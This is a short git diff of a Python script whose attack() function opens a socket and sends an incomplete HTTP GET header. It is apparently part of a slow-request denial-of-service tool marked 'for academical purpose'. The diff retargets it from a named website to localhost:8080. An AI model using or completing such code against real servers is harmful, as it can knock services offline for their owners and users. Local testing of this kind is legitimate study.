@@ -8,15 +8,16 @@ import threading
 # pay attention, use it only for academical purpose
 
 def attack():
-    target_host = "www.my_site.it"
-    target_port = 443  # create a socket object
-    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
-    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s_sock = context.wrap_socket(client, server_hostname=target_host)
+    # target_host = "fake.website.com"
+    # target_port = 443  # create a socket object
+    # context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+    # client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # s_sock = context.wrap_socket(client, server_hostname=target_host)
 
     # connect the client
-    target_host = "www.this_is_not_a_real_website.com"
-    target_port = 80
+    target_host = "localhost"    
+    target_port = 8080
+    s_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s_sock.connect((target_host, target_port))
     request = "GET / HTTP/1.1\r\nHost:%s\r\n" % target_host
     s_sock.send(request.encode())
